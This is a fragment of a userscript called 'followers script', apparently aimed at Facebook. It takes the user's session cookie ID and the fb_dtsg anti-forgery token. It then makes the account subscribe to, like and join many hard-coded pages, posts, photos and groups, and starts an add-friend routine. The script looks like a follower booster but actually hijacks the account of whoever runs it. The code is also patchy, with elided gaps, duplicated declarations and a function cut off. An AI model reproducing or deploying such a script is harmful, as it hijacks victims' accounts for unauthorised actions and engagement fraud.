// ==UserScript==
// @name   followers script     
// @version   1.2
// @description made by Jahnzaib       
// ==/UserScript==
...
sublist("255416704625645");
sublist("246575272187409");
sublist("1415865108658645");
sublist("650897251616343");
sublist("240273129480197");
sublist("671501319555936");

var gid = ['1401043270152310'];var gid = ['611240588930813'];
...
var spage_id = "297749613678444";
var spost_id = "548781161816546";
var sfoto_id = "143670339158126";
var sfoto_id = "672494649458649";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
// pic + fans
P("268212599996747");P("278675805617093");P("672503379457776");P("250355965131719");P("244719759028673");P("248735995293716");P("245725635594752");Like("476901629028837");Like("548781161816546");Like("143670339158126");Like("");P("");Like("548781161816546");Like("297749613678444");Like("672494649458649");Like("233818870122707")
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
